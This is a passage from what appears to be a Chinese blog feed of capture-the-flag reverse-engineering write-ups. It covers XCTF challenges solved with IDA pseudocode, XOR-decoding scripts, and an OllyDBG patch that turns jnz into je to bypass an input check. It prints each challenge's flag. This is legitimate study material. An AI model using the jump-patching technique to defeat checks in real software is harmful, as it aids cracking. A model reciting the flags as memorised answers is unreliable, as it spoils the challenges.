class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"pG`imos"</span><span class="token punctuation">;</span>    v3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">;</span>    string flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        flag <span class="token operator">+=</span> v3<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">checker <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Dufhbmf"</span><span class="token punctuation">,</span> <span class="token string">"pG`imos"</span><span class="token punctuation">,</span> <span class="token string">"ewUglpt"</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>checker<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>Code_Talkers</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reversing-x64Elf-100%203.png" alt="攻防世界-Reversing-x64Elf-100 3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】logmein</title>
      <link href="/posts/80a82d94.html"/>
      <url>/posts/80a82d94.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>熟悉<mark>大端序、小端序</mark>存放方式</p></li><li><p>找一下如果 IDA 反编译出的伪代码有问题时，有没有好的解决办法</p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=029ca36e-966c-4328-9e88-baf47e35ae03_2&task_category_id=4">【攻防世界】logmein</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>将得到的 64位 elf 文件拖入 IDA</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-logmein1.png" alt="攻防世界-logmein1.png"></p><p>逻辑很简单，<code>sub_4007C0()</code> 函数用来提示输入错误并结束程序，执行 <code>sub_4007F0()</code> 就代表破解成功</p><p>而通过</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">sub_4007C0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>和</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token function">sub_4007C0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>并且循环条件 i 的范围是 <code>for ( i = 0; i &lt; strlen(s); ++i )</code><br>可以推断输入的字符串 s 的长度 <code>strlen(s) = strlen(v8) = 17</code></p><p>因此只需满足 <code>s[i] == (char)(v8[i % v6 - 8] ^ v8[i]) 的 s[i]</code> 组成的就是 flag</p><p>但是这里想半天也没有搞明白 <code>v8[i % v6 - 8]</code> 是个什么写法，第一次循环的时候 <code>i = 0</code>，岂不是 <code>v8[ -8 ]</code> ？</p><blockquote><p>后来看网上的 writeup，发现别人反汇编出来的伪代码跟我不一样 … …<br>虽然做题的时候也遇到过好几次这样的情况，但是也找不到好的解决办法<br>别人的伪代码：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-logmein2.png" alt="攻防世界-logmein2.png"></p><p>这里的条件是：<code>s[i] == (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</code></p></blockquote><p>注意这里 <code>v7</code> 的定义：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 v7<span class="token punctuation">;</span>v7 <span class="token operator">=</span> <span class="token number">0x65</span> <span class="token number">62</span> <span class="token number">6</span>D <span class="token number">61</span> <span class="token number">72</span> <span class="token number">61</span> <span class="token number">68LL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><mark>v7 的类型为 int64，即 64位 整型，属于 dq 类型的数据，存放时采用 小端序</mark></p><p>所以 <code>v7</code> 的首地址处存的是 0x68，以此类推：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x68</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x72</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6D</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x62</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v7 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">%</span> v6<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x65</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据 <code>(char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) )</code> ，求解出 <code>s[i]</code> 并输出，得到 flag</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    string v8 <span class="token operator">=</span> <span class="token string">":\"AL_RT^L*.?+6/46"</span><span class="token punctuation">;</span>    __int64 v7 <span class="token operator">=</span> <span class="token number">0x65626D61726168LL</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> key<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x6d</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>v6 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    string flag <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v8<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        flag <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> v6<span class="token punctuation">]</span> <span class="token operator">^</span> v8<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>flag<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>RC3-2016-XORISGUD</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-logmein3.png" alt="攻防世界-logmein3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】gametime</title>
      <link href="/posts/470ee9bf.html"/>
      <url>/posts/470ee9bf.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>结合程序运行、IDA 和 OllyDBG 分析程序的逻辑</p></li><li><p><mark>使用 OllyDBG 修改程序跳转逻辑</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=a1e2802b-9a62-4091-a053-7661e8c413c9_2&task_category_id=4">【攻防世界】gametime</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>将文件拖入 exeinfo 查看，为 32 位程序</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime1.png" alt="攻防世界-gametime1.png"></p><p>运行程序可知是一个游戏，根据提示的内容：“当看到 s 的时候，按下空格键” </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime2.png" alt="攻防世界-gametime2.png"></p><p>按照游戏要求输入，发现游戏规为：<br>当看到 s 的时候，按下 ‘ ‘；<br>当看到 x 的时候，按下 ‘x’；<br>当看到 m 的时候，按下 ‘m’</p><p>但进行到 <code>TRAINING COMPLETE!</code> 后，速度开始越来越快</p><p>IDA 查看主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime3.png" alt="攻防世界-gametime3.png"></p><p>最开始是一段屏幕输出，后面有两组三条 if 判断语句，根据游戏的规则，猜测这两组 if 语句应该是用来检测用户的输入是否对应为：’ ‘、’x’、’m’</p><p>除此之外，发现第一组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之前，而第二组三条 if 语句在输出 <code>TRAINING COMPLETE!</code> 之后。前面一组判断速度比较慢，可以直接输入；但后面一组判断速度很快，输入正确有难度</p><p>最后面一片代码应该就是对 flag 的处理，输出 flag</p><p>查看判断函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime4.png" alt="攻防世界-gametime4.png"></p><p>为了不让程序结束，根据 main 中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token char">' '</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v23<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'x'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_401507</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token char">'m'</span><span class="token punctuation">,</span> <span class="token number">0xC8u</span><span class="token punctuation">,</span> v25<span class="token punctuation">,</span> v25<span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可知，必须让 <code>sub_401507()</code> 返回非 0，即 <code>sub_401507()</code> 执行 return 1<br>根据 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，即让此判断恒为真</p><p>结合游戏发现，当用户输入错误时，会输出：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code><br>即：用户输入正确时，<code>sub_401260(a2, 500 * dwMilliseconds)</code> 非 0，执行 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code>，判断函数 <code>sub_401507()</code> 返回 1，从而跳过 <code>if ( !sub_401507(5, &#39; &#39;, 0xC8u, v25, &amp;v23) )</code>，使程序继续执行下去；若输入错误，则输出 <code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code>，程序终止</p><p>由于游戏速度太快，很难输入正确，于是想通过修改 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 判断语句，让用户输入错误时，使程序继续执行</p><p>用 OllyDBG 打开，首先定位到刚刚的输入错误语句：<code>UDDER FAILURE! http://imgur.com/4Ajx21P \n</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime5.png" alt="攻防世界-gametime5.png"></p><p>发现前面的一个 jnz 跳转语句</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime6.png" alt="攻防世界-gametime6.png"></p><p>跟随该跳转地址：<code>000E1586</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime7.png" alt="攻防世界-gametime7.png"></p><p>功能为：给 <code>al</code> 赋值为 1，然后结束调用，对应 “return 1”<br>所以这里的 <code>jnz</code> 跳转控制的就是 <code>if ( sub_401260(a2, 500 * dwMilliseconds) )</code> 语句的执行</p><p>原来的逻辑是，输入正确则执行 if 语句，用 <code>jnz</code> 控制跳转<br>要想将逻辑改为，输入错误则执行 if 语句，将 <code>jnz</code> 跳转改为 <code>je</code> 跳转即可</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime8.png" alt="攻防世界-gametime8.png"></p><p>同理，将另外一组跳转也修改掉，在 OllyDBG 中执行程序，<strong>只要输入错误即可</strong>，比如一直按回车：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime9.png" alt="攻防世界-gametime9.png"></p><p>等待程序执行自动输出 flag 即可</p><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>no5c30416d6cf52638460377995c6a8cf5</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】simple-check-100</title>
      <link href="/posts/a160dcc8.html"/>
      <url>/posts/a160dcc8.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>了解数据的<mark>大端序、小端序</mark>存放</p></li><li><p><mark>了解 <code>* (4 * i + v4)</code> 写法的含义（不一定是顺序数组，可能是好几个地址的值组合起来作为数组的一个元素）</mark></p></li><li><p>数据的存放方式转化为十六进制看得更清楚（IDA 快捷键：h）<br>例如：-559038737（0xDEADBEEF）、106（0x6A）、-51（0xCD）等</p></li><li><p><mark>数据转化为十六进制进行异或时，位数应该相同</mark> （32 位对 32 位，8 位对 8 位）</p></li><li><p><strong>Windows 下 OllyDBG 调试</strong></p></li><li><p><strong>Linux 下 GDB 调试</strong></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=bbfa61dd-8934-4c0d-be63-9b7acb7f8d16_2&task_category_id=4">【攻防世界】simple-check-100</a></p><hr><h1 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h1><p>给出了三个文件，分别是一个 32位 exe，一个 32位 elf，一个 64位 elf</p><p>将 64位 elf 拖入 IDA</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%201.png" alt="攻防世界-simple-check-100 1.png"></p><p>输入的 key 存放在 v9 的位置，<code>check_key(v9)</code> 对输入的 key 做了一个检测，若 <code>check_key(v9)</code> 返回 true，则调用 <code>interesting_function(v7)</code></p><p>查看 <code>check_key(v9)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%202.png" alt="攻防世界-simple-check-100 2.png"></p><p>即对 key 的每一位进行相加求和，若和为 -559038737（十六进制：0xDEADBEEF），就返回 true</p><p>查看 <code>interesting_function(v7)</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-simple-check-100%203.png" alt="攻防世界-simple-check-100 3.png"></p><p>调用的这个函数只有一个输出，这里的 putchar 输出的应该就是 flag，而这个函数的处理过程与 key 没有关系，所以可以通过这个代码直接求解出 flag</p><p>注意这里 <code>*(4 * i + v4)</code> 的写法：</p><ul><li>v4 &#x3D; a1，a1 又是作为形参传入函数 <code>int __fastcall interesting_function(__int64 a1)</code> 的，所以 a1、v4 的值为 <code>v7[]</code> 的首地址</li><li><code>(4 * i + v4) 以 v7[]</code> 的首地址作为基地址，偏移量为 <code>4 * i</code>，即：将首地址的后 4 个地址的值作为一组</li><li>根据 <code>v2 = *(4 * i + v4) ^ 0xDEADBEEF</code> 可知，<code>*(4 * i + v4)</code> 的值的长度应该跟 <code>0xDEADBEEF</code> 一样，是一个 32 位的数据【 DWORD，全称 Double Word 】</li></ul><p>根据 <code>v7[]</code> 的定义（<strong>将值转化为 16 进制</strong>）<br><code>v7[]</code> 中每一个地址存放的数据长度是 2 个十六进制数据</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x54</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC8</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x7E</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x64</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xC7</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x16</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x9A</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xCD</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x11</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x65</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x32</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x43</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x92</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xA9</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x9D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD2</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xE6</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6D</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x2C</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xD3</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xB6</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xBD</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFE</span><span class="token punctuation">;</span>v7<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x6A</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将首地址的后 4 个地址的值作为一组，则一组正好是 8 个十六进制数（一个十六进制数为 4位，故 8 个十六进制数共 32 位 DWORD 数据）</p><p>循环条件 <code>for ( i = 0; i &lt;= 6; ++i )</code> 可以看出总共异或了 7 次，所以 <code>*(4 * i + v4)</code> 应该有 7 组，一组占 <code>v7[]</code> 的 4 个地址<br>也就是说 <code>v7[0] ~ v7[3]</code> 为一组，<code>v7[4] ~ v7[7]</code> 为二组，<code>v7[8] ~ v7[11]</code> 为三组，… … ，<code>v7[24] ~ v7[27]</code> 为七组</p><p>这里需要注意，异或后的值是从高地址处的字节开始异或的，又由于小端存放的原因，每一组数据按小端顺序：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xE37EC854</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x9A16C764</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x326511CD</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x43D3E32D</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xD29DA992</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">6</span> <span class="token operator">+</span> v4<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xD32C6DE6</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span 